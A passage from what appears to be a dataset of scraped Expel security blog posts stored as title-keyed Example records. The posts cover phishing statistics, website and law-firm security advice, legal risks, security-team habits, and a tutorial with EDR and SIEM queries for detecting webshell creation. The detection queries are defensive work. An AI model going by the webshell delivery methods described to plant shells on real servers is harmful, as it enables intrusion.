(VBA macro) or Excel 4.0 macro was the initial attack vector in 55% of all pre-ransomware incidents. 5: The top subject line theme for malicious emails wasno subject line at all (followed by Invoice, Order confirmation, Payment, and Request). Sneaky, cheeky hackers. While the specific wording may change, our data shows that threat actors love a good theme when it comes to subject lines. The top malicious theme? No subject line. Nada. Blank. The rest are what youd expectinvoice, order, payment, urgent, etc. These high spots are just what a foodie would call an  amuse-bouche.  Theres so much more (including a fun mystery that were working to unravel), and odds are pretty good the full QTR offers some insights and advice your team can make use of. Download yours here , and if you have questions or comments, drop us a line .'}) (input_keys={'title'}),
  Example({'title': 'Five quick checks to prevent attackers from weaponizing ...', 'url': 'https://expel.com/blog/prevent-attackers-from-weaponizing-website/', 'date': 'Aug 22, 2018', 'contents': 'Subscribe  EXPEL BLOG Five quick checks to prevent attackers from weaponizing your website Tips  4 MIN READ  BRUCE POTTER  AUG 22, 2018  TAGS: Get technical / Heads up / How to / Overview / Vulnerability If you work in security, chances are good you got an email from someone Monday (August 20, 2018) asking if your organization was safe from the attacks that Microsoft announced by the Russian threat group APT28 (also called Fancy Bear). Microsoft and other large infrastructure providers are in a unique position to see potentially malicious activity and determine not just the target, but the source of the attack as well. In this case, theyve identified yet another attack from APT28, an organization with a history of interfering with the U.S. democratic process. And beyond simply announcing these attacks and the takedown of the malicious websites, Microsoft is also rolling out a program free of charge to candidates, campaigns and related political institutions using Office 365. But if youre not a candidate, campaign or related political institution, whats your takeaway from this announcement? What would they want with your website? You may be thinking we arent a target for nation-state actors. While thats true for many, there are lots of different types of attackers that may be very interested in your website. Here are some of the most frequent ways attackers can use your website and your web presence to harm your company, your users and the public at large. Serving up malware: By embedding malware into an existing website, attackers trade in on the trust youve built with your users to compromise their machines. The embedded malware then executes drive-by attacks on your users that can significantly damage your brand and impact a large number of people. A Chinese hacker group did this to target specific individuals registering for a foreign trade lobbying group ahead of a China-US presidential summit. Spoofing your website: Attackers can create websites with addresses similar to yours. They use confusingly named or similar domain names to the websites you already own. By tricking users to go to these fake sites, attackers can harvest credentials and plant malware to gain access to the users systems. For example, in this recent Microsoft announcement, the domain my-iri.org was meant to imitate the International Republican Institute located at the domain iri.org. Getting into your infrastructure: Best practice is to keep your external website separate from your infrastructure. But thats not always practical. If your website is connected to other parts of your network, an attack against your website can serve as a gateway for attackers to move further into your enterprise. Denial of service: Your website is your primary face to your customers. Its also the place where angry customers can express their dissatisfaction. Hopefully, unsatisfied customers will stick to filling out a web form to lodge their complaint. But if theyre bored and skilled, occasionally theyll take it to the next level and launch a denial of service attack to take your whole web presence offline. The size and scope of DoS attacks have increased dramatically in size over the last year , according to Arbor. Defacement: Once a common activity on the Internet, defacements have waned over the years. But hacktivists and others threat actors still target websites to gain control and change content to promote their ideology. Defacements are often crude, but they can still be jarring to your users and impact your companys reputation. Five things you can do Managing cyber risk is a balancing act of cost versus risk, and your specific situation will be unique to your own organization. But there are some general truisms when it comes to securing your web presence and weve pulled together five recommendations that should apply to most organizations. Two factor everywhere: In general, you should use two-factor authentication (2FA) anywhere possible. But, in particular, when its your website, you should enable 2FA for administrators to limit the impact of compromised passwords. Many content management systems (CMS) dont have 2FA support natively. However, there are plugins for every major CMS that enable 2FA support with common one-time password solutions. Dont run your own website: Really, running a website is a lot of work. Maintaining the operating system, staying current on the content management system, staying current on best configurations and practices and monitoring for various attacks is more effort than many companies are willing to put into their website. The good news is that you can pay others to run websites for relatively cheap, sometimes even free depending on what your requirements are. If youre running your website today, consider outsourcing it as soon as possible. Monitor for look-alike domains: Your website only has one correct spelling. Your users, however, dont really pay that much attention, and there are many misspellings and deceptively named domains that may trick them into visiting a malicious site. There are lots of services that you can use to monitor potentially malicious domain registrations so you can work with registrars to take down infringing domains and warn your users. Patch and audit: If you do run your own website, youve got to stay current on patches. Modern CMSs make patching easy. Usually it just takes the push of a button. Thats super important because attackers can weaponize published vulnerabilities in CMSs in a matter of hours. Its important that you patch as soon as possible and audit administrative access logs for suspicious activity. Limit plugins: Historically, CMSs have been a disaster from a security perspective. However, due to the risk they represent to websites, most CMSs have really stepped up their game and are relatively secure. The weak link is now the plugins that users install to add functionality. Be sure to vet your plugins before you install them. Some have been well written and audited; others are sort of fly by night and have little to no support or documentation. Often, hosted CMS providers have a list of acceptable plug-ins. These lists are usually a good starting point to pick which ones you want to use. Conclusion So  back to that are we safe email that higher-ups love to send after every headline. The guidance above should help you explain how and why attackers compromise websites and what you can do to prevent it. But once the latest headline passes, Id recommend using something like the NIST Cybersecurity Framework to explain your broader security strategy to execs. Once you school them on it, youll find its an invaluable tool that you can point to when the next headline hits about the risk they are consciously (or unwittingly) accepting based on the security investments theyve approved.'}) (input_keys={'title'}),
  Example({'title': 'Five things law firms can do now to improve their security ...', 'url': 'https://expel.com/blog/5-things-law-firms-can-do-now-improve-security-tomorrow/', 'date': 'Sep 5, 2019', 'contents': 'Subscribe  EXPEL BLOG Five things law firms can do now to improve their security for tomorrow Security operations  6 MIN READ  AMANDA FENNELL  SEP 5, 2019  TAGS: CISO / How to / Managed security / Planning Amanda Fennell is the Chief Security Officer at Relativity, the global legal technology company whose software platform is used by thousands of organizations around the world to manage large volumes of data and quickly identify key issues during litigation, internal investigations and compliance projects. Relativity has 180,000+ active users and works with 198 of the AM Law 200. Its SaaS platform, RelativityOne, is the fastest-growing product in company history. I joined Relativity in January 2018 and it took battling a blizzard in Chicago to walk through the doors that day. Similarly, the weather in the security landscape hasnt let up in the past year and a half. Larger organizations receive a lot of direction and attention to navigate these cyber storms, but it can be difficult for organizations without a lot of data  or the right connections  to clear frameworks like PCI or HIPAA. Legal services organizations, including law firms, are a big part of our user community and we know that this industry needs and is demanding more guidance, info and standards on protecting client data. Im often asked about how legal services organizations and law firms approach security and if its different from the other industries Ive worked in, or managed the security for, throughout my career. Security hasnt always been at the forefront for legal services companies and law firms. But the legal services industry presents a softer target for many adversaries, and the data loss from a successful intrusion can lead to stolen intellectual property, merger and acquisition details or even direct financial manipulation. Financial gain is still the major motivation in cyber attacks, with the exception of a few industries  meaning that the legal services industry will always be on the target list. Developing a mature security program is often a very expensive venture for small to medium-sized firms but Ive met many forward-thinking security leaders in the industry whove been able to make some swift and lengthy strides in protecting their clients data. Here are five specific things that orgs in the legal industry can do right now to create immediate, measurable security benefits. #1  Perform a risk assessment One thing Ive observed is that firms that have more mature security approaches also tend to have a better understanding of the risks they face. If youre proactive about security, youll be a pace setter amongst your peers. No matter your orgs size, conducting a risk assessment is a critical first step  whether you do it in house or hire an external firm. It may be intimidating, particularly if you havent previously done a risk assessment, but making even relatively minor changes in organizational or employee behavior can shrink some of your largest risks. In order to fully understand where gaps exist, its necessary to assess your current level of risk. Youll also find a more positive reception from the partners in your firm when you turn security into a risk-based discussion versus a cost-based discussion since they help clients manage risk every single day. #2  Vet your partners Law firms rely heavily on third-party partners and vendors  and they place a lot of trust in these other companies. As we learned from the Target breach in 2013 , trusting vendors implicitly without doing your due diligence can have disastrous results. Attackers target law firms to get access to their clients data and they target the vendors used by law firms to exploit that relationship and bypass more difficult routes of compromise. Its essential that you vet partners and vendors to ensure their security meets your own standards and requirements. Supply chain attacks are often a very successful attack vector against orgs with a shortage of security talent  which brings me back to knowing whats at risk in your org and where you should focus your efforts. The vetting process typically begins with checking compliance certifications such as the ISO 27000 standards and SOC 2-Type 2, along with industry-specific certifications such as HIPAA, PCI, and others as applicable. For your closest and most important partners, you should have frank conversations with them about how you both view security. Do you have alignment and the same expectations? Do you share the same vision? Have you established mutual trust? Frequently ensuring your partners and vendors are doing security correctly is overlooked. It is important to ensure that you dont allow your most trusted allies to become your greatest source of risk. #3  Embrace the human element (aka phishing) The most common attack vector is still phishing. The legal industry is no different in that this method is highly effective and can lead to devastating results. The good news is that with some education, training and good tech, your firm can successfully mitigate this threat. Teaching your employees to recognize a phishing email and what steps to take when they receive one is an easy and effective place to start. At Relativity we host regular phishing simulations to train our employees to identify phishing emails and the results have been very rewarding. In looking at our initial phishing email campaign and comparing it to the most recent simulation, we saw a drop of 40% in terms of employees taking incorrect actions. We treat each Relativian as a cyber warrior in the battle to protect our and our customers data. Humans have the ability to be our greatest strength against phishing or social engineering attempts, rather than a weak link in the chain  but its our job as security professionals to inspire and educate them. #4  Pay attention to whats happening to other firms Once youve identified your largest risks and then start addressing the basics, its time to think more proactively about how you can stay ahead of emerging threats. One method of accomplishing this is to pay attention to whats happening at other firms from a security perspective. Read law trades about incidents at other firms, talk to your peers, attend industry events like ILTACON or Relativity Fest and participate in the Legal Services Information Sharing Organization (LS-ISAO) . Theres nothing more useful in security than the human connections we make with others who are struggling with similar issues or concerns. Organizations and firms represent a spectrum of security maturity at these events. Attendees find not only how others have resolved concerns that are similar to their own, but also how to stay ahead of the threats that are most commonly targeted at the legal services industry. Attacks are growing exponentially and everyone is suffering  which is why we developed our threat intelligence feed thats focused on the legal services industry for our RelativityOne customers. We collect and correlate data from our honey networks and from all the customers we work with  then we anonymize it and make it true threat intelligence that we share. This provides our customers with an industry-wide look at threats relevant to firms or organizations just like their own. This allows even small and medium-sized orgs and firms to take advantage of up-to-date, real-time, actionable threat intelligence to strengthen their security posture. Focusing on where your blind spots are is key to preventing a potential breach. What might appear to be random scanning from one log can be correlated to other activity and may identify behaviors of an advanced persistent threat (APT) actor attempting to compromise a law firm through a remote desktop viewer (yes, this actually happened). #5  Bake security into everything you do As the adage goes, security isnt something you buy, its something you do. Improving your security posture is a process that will take time. When security is a priority, youll see security advocates getting a seat at the table for important business discussions and decisions. Partners want the security team to weigh in and green light their decisions. Security is about managing risk. Another sign of security maturity is seeing security baked into many processes such as the Secure Software Development Lifecycle (SDLC). The security team  or lead partner who manages security  should be consulted for security impact assessments, vendor reviews, major decisions in engineering, every project that is going to affect the code and many other business decisions that need to be made. Security is everyones responsibility A few years ago during a keynote address at Relativity Fest London, our founder Andrew Sieja said something Ill never forget: Its an honor and a privilege to be a part of the legal profession  and thats something every lawyer feels. That stuck with me because it highlights the great responsibility we have to all our clients using the Relativity platform and RelativityOne, our secure SaaS platform hosted in the Microsoft Azure cloud. Were helping them do important work and part of that partnership means keeping their information and their clients information secure through our work in the Calder7 security group and our company-wide commitment to building a culture of security. Hopefully some of these tips will help you improve your security posture. If, on the flip side, youre looking at these five tips and saying, Ive already done that, then help others. Speak at conferences, publish whitepapers or collaborate on a blog post with a partner. We love quoting Winston Churchill in Calder7: Our fight is hard. It will also be long  but win or lose, we must do our duty.'}) (input_keys={'title'}),
  Example({'title': "Five things that'll help you determine whether you'll like ...", 'url': 'https://expel.com/blog/five-things-help-determine-like-working-at-company/', 'date': 'Nov 12, 2019', 'contents': 'Subscribe  EXPEL BLOG Five things thatll help you determine whether youll like working at a company Talent  6 MIN READ  JEREMY FURNISS  NOV 12, 2019  TAGS: Employee retention / Great place to work / Hiring Growth only happens when you are uncomfortable. My wife and I say this to our kids all the time. But heres the funny thing: For all the advice I give to my children on a regular basis, there are moments when as a parent you have to live the advice you give and lead by example. Earlier this year, I found myself at a crossroads in my career. After spending time working in industries for which I had very little innate passion (even though I was successful selling in this space), I had to figure out if I wanted to stay the course or try something new. Sure, I could continue doing what I was doing, but would that really bring me career satisfaction for the next 15 years? The biggest challenge I was wrestling with is that I stopped believing that the products I was selling were truly making an impact. I could have continued down the path I was on, selling software solutions to the people and companies I already knew, or I could enter into the field of cybersecurity and try something new in an industry that Id always wanted to explore. Inherently I always had an inclination that I wanted to be a good guy who stopped bad guys  I was always drawn to traditional law enforcement. But many years ago I decided that wasnt the path for me and that I preferred working in computer software  so a job in cybersecurity made sense. So when a friend of mine encouraged me to take a look at Expel  a company he thought might be a great fit for me  I was excited. But I pushed off applying for weeks because I assumed they would have no interest in someone who didnt grow up speaking cybersecurity. However, the more research I did about Expel, the more it occurred to me that they just might value the fact that Id bring a different perspective and set of skills with me to the company. So I submitted my resume and landed an interview. And while Expel was interviewing me, I interviewed them as well  making sure the company was truly a place Id want to work. Was this a place where Id fit in? Where Id get the support I needed? Could I envision myself being there for years to come? Here are five key things I looked for during my interview process to help me figure out the answers to all those questions and more. Sense of humor It all started with the job description. (If youve never seen an Expel job posting, you can check some out right here .) After working for years in an industry rife with buzzwords, it was refreshing to find a company that doesnt take itself too seriously. The employees I met at Expel were no different. They were whip-smart and hard-working, but they also knew when to crack a joke and relax. When you see an Austin Powers movie poster on the wall, you know youre not in a traditional, stuffy office environment. As I walked through the office for the first time, I also noticed the meeting rooms had funny names  Pick Your Brain, Out of the Box, and Lets Unpack This, to name a few  because the team likes to poke fun at (and avoid using) business buzzwords and industry jargon. Even in the absence of clever conference room names, you can still figure out by looking around an office if they employees are stressed out and chained to their desks, or if theyre relaxed and happy about coming to work. Take notice and think about whether it looks like an environment youd want to work in. Genuine respect for employees (and people in general) On Expels Careers page , the first sentence says it all: At Expel, we believe if we take care of our employees, they will take care of our customers, and the rest will work itself out. Many companies say they care about their employees, but those claims quickly unravel when its time to demonstrate that care and respect. Most companies view employees as interchangeable cogs in their revenue machine  thinking of them more as human resources instead of people. But the reality is that customers buy from people they like and trust. Which means that the people (and how a company treats them) matter a lot. Being passionate about your company and the problems their products solve comes through loud and clear in the sales process. A customer can tell if you personally believe in the company and the solution or not. A customer can also tell if an employee is happy . During your interview process, think about what makes you happy at work. Beyond a great product or solution that you believe in, what else do you need personally to succeed? Ask about those things during your interviews. A no-BS attitude toward selling The simplicity of the sales process at Expel really appealed to me. This line from the job description is completely accurate: Maybe they need your thing, maybe they dont, but they trust you and youll get 30 minutes to see if theres a fit. Now that Im part of the Expel team, I can tell you that the discussions we have with potential customers are so refreshing. Theres clean and concise dialogue. Theres collaboration. Theres a real desire to solve a problem and help a customer. I like that Expel takes all the old school, annoying sales tactics  the long PowerPoint presentations, the long lunches, the finger pistols  out of the sales process. As I think about how Expels sales process differs from others that Ive experienced, I always wonder, Why doesnt everyone do business this way? Dive deep with your interviewers to figure out what the sales process really looks like. Ask for real-life examples of engagements with prospects. Culture of transparency Expel doesnt just talk about culture and transparency. The company puts it into practice. From my first phone interview to the moment I walked into the office in Herndon as a full-time hire, the culture permeates the environment. The people are genuine. Everyone is inherently driven by the success of the company versus personal success. In most sales teams the environment is typically one full of selfish motives and attitudes, especially when a new rep joins the team and takes a piece of someone elses pie. But from day one, my colleagues at Expel have been my coaches and advocates to accelerate my path to success, including me in calls with prospects and sharing their resources and tips that have helped them along the way. Will your new company help you get up to speed and share their lessons learned so that you can be successful? Or do they take an every (wo)man for herself approach to sales? Ongoing support and encouragement The hiring process reminded me of one of my favorite books: Good to Great by Jim Collins . For the culture to scale as we continue to grow, we have to get the right people on the bus  and that doesnt necessarily mean people with the right industry knowledge. Sure, thats helpful, but there are certain traits we look for here at Expel that cant easily be taught. The leadership team knew I didnt have a cybersecurity background but they were committed to teaching me about the industry. The team gave me access to online training modules for security novices, which were so valuable in expediting my onboarding timeline. Key leaders within our company gave me their time as part of a sales enablement program which laid out the roadmap for success. Make sure to ask about what kind of support you have. What does that support look like, and whos it coming from? One month later  After starting with Expel one month ago, its exceeded my expectations. Prior to my first day, an amazing welcome box showed up on my doorstep (Im a remote employee), which I shared in this post . From that day forward, the journeys been exciting for our entire family. Our four kids have asked questions, watched cybersecurity tutorial videos, and more  and now my youngest says that Expel is like Batman for the computer. Theyre now more interested in understanding what their Daddy does every day, which theyve never taken much interest in before. As a working parent, one thing I hope to model for my children is how to be not just content with but energized by your work. By carefully contemplating my next career move, asking lots of questions and finding a company with a culture that felt very me, I get to show them what that great energy looks like every day. Theyve seen firsthand how stepping outside my comfort zone has blessed us to be a part of an amazing opportunity to change the market for managed security providers.'}) (input_keys={'title'}),
  Example({'title': 'Four common infosec legal risks and how to mitigate them', 'url': 'https://expel.com/blog/four-common-infosec-legal-risks-how-to-mitigate/', 'date': 'Apr 24, 2019', 'contents': 'Subscribe  EXPEL BLOG Four common infosec legal risks and how to mitigate them Tips  4 MIN READ  MARC ZWILLINGER AND MARCI ROSEN  APR 24, 2019  TAGS: Cloud security / Managed security / Management / Planning / Security Incident Marc Zwillinger and Marci Rozen are attorneys at ZwillGen PLLC and are based in Washington, D.C. They both counsel clients on information security and privacy issues, handle incident response and advise on cross-border data protection. All views expressed in this article are the authors personal observations, and should not be attributed to ZwillGen, any of its other attorneys, or any of its clients. With major data breach settlements capturing headlines every few weeks, most executives are well aware that security incidents pose legal and even existential risk to companies. But as regulatory interest in information security grows, companies face an increasingly broad and varied set of risks in this area. Here are four missteps we see happen often that open fast-growing companies up to unnecessary legal risks. The good news? There are some straightforward ways to mitigate these risks. Risk 1: Failing to implement risk-based security controls As companies face increasing pressure to expand and deliver more convenient services, it can be tempting to prioritize speed over security. However, failing to maintain security controls that are appropriate to the risk posed by data can result in significant legal exposure. The EUs General Data Protection Regulation (GDPR) and a number of state laws allow regulators to bring enforcement actions against companies that fail to maintain reasonable security controls for personal information. And the new California Consumer Privacy Act (CCPA), which takes effect on January 1, 2020, provides a private right of action to California consumers whose personal information is breached as a result of unreasonable security. HOW TO MITIGATE THE RISK Despite the popularity of the term, there is no single definition of reasonable security, but there is consensus that reasonableness depends on the risk posed by the data in question. This is why companies should conduct a risk assessment for each type of dataset they maintain and implement risk-based controls, ideally using a recognized framework like the NIST Cybersecurity Framework. Risk 2: Overlooking vendor security Your companys security is only as good as the security of your vendors that maintain and/or access your data. Vendors are a popular attack vector for the bad guys who are looking for a point of entry into large corporate networks, as the vendors security defenses may not be as strong as their clients. Unfortunately, even if a breach is the result of a vendors subpar security, the data owner still bears legal responsibility for issuing breach notifications and providing credit monitoring (unless the contract with vendor says otherwise) and for responding to regulator inquiries. Additionally, proper vendor selection is part of reasonable security, as described above. HOW TO MITIGATE THE RISK Require your vendors to sign a robust information security addendum or provide other proof of a mature information security program, like a third-party audit report (e.g., SOC 2 or ISO 27001). In addition, your vendors should be required to notify data owners as soon as possible following a breach that affects the owners data. Ideally, your contract should also require the vendor to reimburse any costs associated with responding to such a breach, but many vendors will push back against these kinds of requirements. Risk 3: Not documenting security practices  or failing to put your policies into practice Even a company with state-of-the-art security practices faces risks if those practices arent documented in policies that are regularly reviewed and updated. Not only are information security policies required under various laws, including Massachusetts data security law and the New York Department of Financial Services cybersecurity regulations , but theyre also essential for IPO readiness. Conversely, its equally risky to establish policies that your company doesnt follow, or to make unsupported security claims to potential customers. This opens your company up to allegations of deception. Companies considering going public must be prepared to disclose material cybersecurity risks in registration statements, and you should expect the underwriters conducting diligence to request copies of information security policies. HOW TO MITIGATE THE RISK If your organization hasnt implemented information security policies, you need to document what practices are currently in place, and consult with outside counsel or an independent security assessor to determine whether you need to make improvements to comply with applicable law or industry standards. If your company already adopted information security policies, make sure theyre regularly reviewed by management and updated to reflect current practices. Risk 4: Sidelining your legal team during incident response As the team with technical expertise and first-hand knowledge of the facts of a security incident, its natural and appropriate for information security personnel to play a leading role when a security incident happens. However, with incidents that pose legal risk, legal teams (either in-house or external or both) play an equally critical role. When legal teams direct and coordinate response efforts with the IT folks, your company will have the ability to claim privilege over communications and work product  including the draft forensic reports if your providers are engaged under privilege. If youre successful, these claims can protect interim, incomplete conclusions and other sensitive information from disclosure during litigation and some types of regulatory investigations. Youll also want to involve your legal team to assess breach notification obligations and identify other areas of risk exposure throughout the incident response process. HOW TO MITIGATE THE RISK Make sure your company has incident response plans that designate internal or external counsel as being responsible for directing incident response efforts and engaging all third-party vendors. Using outside counsel that specializes in incident response has the added benefit of bolstering privilege claims and lending additional expertise. While there will always be unique legal risks associated with information security, the good news is that with some advanced planning you can mitigate these and better protect your company, its data and the customers you serve.'}) (input_keys={'title'}),
  Example({'title': 'Four habits of highly effective security teams', 'url': 'https://expel.com/blog/four-habits-highly-effective-security-teams/', 'date': 'May 6, 2019', 'contents': 'Subscribe  EXPEL BLOG Four habits of highly effective security teams Security operations  3 MIN READ  PETER SILBERMAN  MAY 6, 2019  TAGS: Employee retention / Managed security / Management / Planning / SOC No matter if your security team is big or small, I bet you feel understaffed to deliver on your mission. And if your team is just you then you should multiply those feelings by 10x. Youre not alone. In the absence of having the people and budget to snag all of the products on your wish list  or the people to help shrink your to-do list  how can you behave like a team twice your size and focus on the stuff thatll make the biggest impact? Here at Expel, were fortunate to have a bunch of people whove been managing teams and building security operations centers (SOCs) for eons. Looking back at our collective experience, we identified four consistent habits that all the highly effective security teams weve been a part of have practiced. Heres what we observed and why it all matters, whether youre a security team of one or 100. 1. They understand what their products do When it comes to security tech, highly effective security teams focus on two things: 1) The alert signal each vendors technology produces and 2) What questions they ask of their technology during an investigation. We work with more than two dozen different products here at Expel. Weve taken the time to generalize the various capabilities that an EDR, Network or SIEM vendor can offer an analyst. We think about the capabilities offered by each class of technology as a capability model. It doesnt matter how EDR vendor A or vendor B acquire files; our analysts know that vendor A and B offer an acquire file capability and they use Expel Workbench to fetch that file from either vendor. In short, creating a capability model is a good way for us to develop a structured understanding of the questions we can ask our technology. 2. They take a common approach to investigating When something goes sideways and its time to take action, highly effective security teams have a consistent approach to how they run an investigation. Its important that investigations follow a defined, repeatable process where analysts take the same actions for the same type of alert every time that alert pops up. For example, when our SOC analysts see an alert for a suspicious login, they know their first step in the investigation is to grab historical data for that user to determine what constitutes normal activity. Note that I said process  not prescription. Yes, you need a standard approach to taking action, but analysts still need to exercise good judgement and make quick decisions. There will always be alerts that turn your usual playbook on its head, which is why ongoing learning and training is so important. 3. They invest in training In my experience, the best security teams make training a priority. So once youve got a grip on what your product(s) do and have your investigative process down, you need to get real hands-on practice  over and over again. One of our favorite ways to keep our analysts sharp is to run threat emulation exercises. Threat emulation is the process of simulating a realistic threat youre likely to encounter with a heavy emphasis on what happens after an attacker breaks in. Its the best way to flex those response muscles and improve your teams collective detection skills. If you want to create your own threat emulation exercise, weve got step-by-step instructions right here. Weve also got some pro tips on how to build a cloud-focused threat emulation exercise in AWS. 4. They demonstrate value to their customers Finally, highly effective security teams demonstrate value to their customers. A great way of demonstrating value is to figure out how to show your work. Note that showing your work is not bringing an incident report to a board meeting. Its important to figure out what your customers want to understand about security and then adjust what and how youre presenting to make sure youre aligning with their business objectives. And when I say customers Im not just talking about the companies that pay you for services. These customers could be your CISO, CEO or a board member. If youre sitting there thinking that building all of these habits into your teams culture feels overwhelming, I get it. In that case, start small  pick one of the four habits and focus on getting your team to execute on that. For example, maybe you have a retention issue because the work isnt interesting or analysts feel like they arent learning. So focus on finding more training opportunities for analysts to flex their detection muscles and have fun doing what they love. Find little ways to keep your security nerds happy and youll have an engaged, talented and all-around awesome team.'}) (input_keys={'title'}),
  Example({'title': 'From webshell weak signals to meaningful alert in four steps', 'url': 'https://expel.com/blog/webshell-weak-signals-meaningful-alert-four-steps/', 'date': 'Sep 19, 2017', 'contents': 'Subscribe  EXPEL BLOG From webshell weak signals to meaningful alert in four steps Tips  7 MIN READ  BEN BRIGIDA  SEP 19, 2017  TAGS: Example / Get technical / How to / Tear sheet Over the past decade, security products have matured from delivering tactical detections to expanding visibility across an enterprise. While seeing more events can lead to empowering discoveries, turning the volume of events into useful investigative leads has been primarily left to the security one-percenters . In this post well show you a practical example of how you can make a weak signal actionable by combining events from your endpoint and network security technologies into one meaningful alert. Specifically, well walk through how you can create actionable detections for webshell activity. Well use Sumo Logic as our SIEM; Palo Alto Networks firewall as our network security device ; and the following endpoint detection and response (EDR) solutions: Tanium or Carbon Black Step 0x00. Weak signals A weak signal is an event that doesnt contain enough context for you to easily determine the next investigative step. These types of alerts need an analyst to spend a lot of time validating them, and they tend to have a low true-positive rate. In most cases, these alerts are the first to be overlooked or pushed to the bottom of the queue for analyst review. Weak signals can take many different forms, depending on what security devices are deployed. For an endpoint product, weak signals often include: A file or registry modification on a host A module load by a process On the network side, these alerts can take the shape of: Outbound web traffic from users Inbound HTTP traffic to a web server Scanning and exploit attempts from the Internet On their own, any of these alerts  without additional context or analysis  are often useless and can be overwhelming. But what happens when you correlate some of these time-intensive alerts to tell a more comprehensive story? Lets take a peek at how this can benefit your organization with our webshell example. Step 0x01. Know what youre looking for (aka webshells 101) (Skip to Step 0x02 if youre familiar with webshells and already tell China Chopper jokes) Webshells often serve as an initial foothold that attackers can use to compromise your internal network. They give an attacker access to a shell on a server in a victims environment via a web browser. To create one, an attacker compromises a web server or web-accessible directory. The attacker will drop a script (or modify an existing page) which allows them to issue remote commands to the compromised system. The scripts can be as small as a few bytes, and they exist in many language flavors (ASP, ASPX, CFM, JSP, and PHP, to name a few). Some contain additional features that help attackers perform reconnaissance, such as file browsers or scanning modules. Webshells are primarily delivered through web application exploits or insecure practices, including: Web administrative interfaces with default or weak credentials Sites that allow arbitrary file uploads Web servers with remote file inclusion, SQL or cross-site scripting (XSS) vulnerabilities Content management system (CMS) vulnerabilities Step 0x02. Alerts in Palo Alto Networks Network vendors like Palo Alto Networks dedicate resources to researching vulnerabilities and developing rules that signal when someone attempts to use an exploit. However, external vulnerability scanning is now part of the normal white noise of the internet. Rarely does an attempted exploit mean that you were actually compromised. So you have to do more work to answer the question, Was the system compromised? To answer that question, an analyst has to search for related network alerts from the target system. If a payload delivered to the system is detected, or the command-and-control (C2) method is known (via URL categorization or based on the contents of the packets), the analyst can determine that the exploit succeeded. Keep in mind that absence of evidence is not evidence of absence. Attackers often use payloads or C2 methods to avoid these types of network detection. For example, passive backdoors like webshells wont generate traffic until the attacker chooses to interact with the resource. In this case, if the attacker used a vulnerability to drop a webshell, we wouldnt necessarily have network evidence indicating the host was compromised. Thats why, in and of themselves, vulnerability alerts can be difficult to action. But there is hope. Heres why. Even if we dont have any related network alerts to analyze, we can build actionable alerts by combining network alerts for vulnerability attempts with relevant endpoint events, such as file modifications. By correlating these alerts you can quickly reduce the flood of vulnerability alerts and focus on the events where the vulnerability exploitation may have been successful. First, we need to find all the exploit attempts. Well collect all the Palo Alto Network activity from hosts that generated an alert in the Vulnerability threat category . To accomplish this, weve configured Palo Alto Networks to forward Vulnerability alerts to Sumo Logic . Once youve done that, you can move on to step 0x03. Step 0x03. Hi ho, hi ho, its off to the endpoint we go Now that we know everywhere there could be a webshell, its time to combine the weak signals together. To do that, we need to correlate the network alerts with any servers that have had script file modifications in a web-accessible directory within 15 minutes of the alert. There are several ways to make the correlation. Well illustrate how you can do it with two of the most common endpoint detection and response tools. Here are some specific examples of queries you can perform with an endpoint security product to capture webshell activity. Keep in mind that these queries are not comprehensive lists of web accessible locations. Theyre just some ideas to get you off on the right foot. Carbon Black Response Carbon Black Response tracks network connections, module loads, remote threads, and file modifications on every endpoint where its deployed. You can query particular events within processes using a feature that Carbon Black calls  Watchlists . The watchlists allow you to save queries, so Carbon Black can inform you whenever a process or binary matches certain event criteria. By creating a watchlist for file modifications in web-accessible directories, we can develop a weak signal to inform our security team when something resembling a webshell is created. An example of a query for webshell creation with Carbon Black might look something like: (filemod:wwwroot* or filemod:htdocs*) and (filemod:.aspx or filemod:.jsp or filemod:.cfm or filemod:.asp or filemod:.php) AND host_type:"server" The data is sent to Sumo Logic by configuring the Carbon Black event forwarder . In our lab, we deployed the Event Forwarder on the Carbon Black Response Appliance and sent the output as JSON to a Sumo Logic HTTP Source . Tanium The Tanium Trace module uses a local datastore to record process events, network connections and file modifications on each endpoint where Trace is deployed. You query it by asking questions through the Tanium Console. Saved Questions are queries that are saved and recur on a predetermined basis. By using the Tanium Trace File Operations sensor to query for any new files created in web-accessible directories we can identify webshell-like activity. An example of a saved question for webshell creation with Tanium is: Get Trace File Operations[1 hour,, 1, 0, 10, 0, (?i).*(wwwroot|htdocs).*.(aspx|jsp|cfm|asp|php), , , , ] and IPv4 Address and Operating System from all machines with Operating System containing "server" The data is sent to Sumo Logic by configuring the Tanium Connect module to send the results of the saved question as JSON to a Sumo Logic HTTP Source. Step 0x04. Correlation The final step is to combine the weak signal alerts from the network device and the alert from the endpoint. To correlate these alerts weve used Sumo Logic as our SIEM. Please note the following about the queries were providing: These queries are intended to work across Sumo Logic regardless of whether field extraction rules are set up. You shoulds use field extraction on ingestion; an example of this for Palo Alto Networks can be found here . The timewindow operator ensures we only join events that occurred within a 15-minute window of each other. This window of time may work for you, or you may need to tweak it depending on endpoint timestamps, clock skew, or other factors. We configured logs to be sent to Sumo Logic in the following format: Palo Alto Networks  CSV Carbon Black  JSON Tanium  JSON The query also assumes youve sent this data to Sumo Logic in the above formats. Our query using Tanium and Palo Alto Networks is: "Expel - Potential Webshell Write" OR "vulnerability" | join (json auto keys "Expel - Potential Webshell Write.IPv4 Address", "Expel - Potential Webshell Write.Process Path", "Expel - Potential Webshell Write.File Path", "Expel - Potential Webshell Write.QuestionName", "Expel - Potential Webshell Write.Endpoint Name" as interface_ip, process_path, file_path, question_name, host_name) as tn, (split _raw delim=\',\' extract 7 as gen_time, 9 as dst_ip, 33 as threat_id) as panw on tn.interface_ip = panw.dst_ip timewindow 15m | fields tn_interface_ip, tn_host_name, tn_process_path, tn_file_path, panw_threat_id, tn_question_name, panw_gen_time Our query using Carbon Black and Palo Alto Networks is: "alert.watchlist.hit.query.process" OR "vulnerability" | join (json auto keys "interface_ip","process_path","ioc_attr","watchlist_name","computer_name","created_time", "ioc_attr" as interface_ip, process_path, ioc_match, watchlist_name, host_name, created_time, ioc_attr) as cb, (split _raw delim=\',\' extract 7 as gen_time, 9 as dst_ip, 33 as threat_id) as panw on cb.interface_ip = panw.dst_ip timewindow 15m | fields cb_interface_ip, cb_host_name, cb_process_path, cb_ioc_attr, panw_threat_id, cb_watchlist_name, panw_gen_time, cb_created_time  If youre interested in taking action on what was discussed in this post, below is a tearsheet with all the queries discussed to put this correlation into practice. Executable Actions Carbon Black Watchlist (filemod:wwwroot* or filemod:htdocs*) and (filemod:.aspx or filemod:.jsp or filemod:.cfm or filemod:.asp or filemod:.php) AND host_type:"server" Tanium Question Get Trace File Operations[1 hour,, 1, 0, 10, 0, 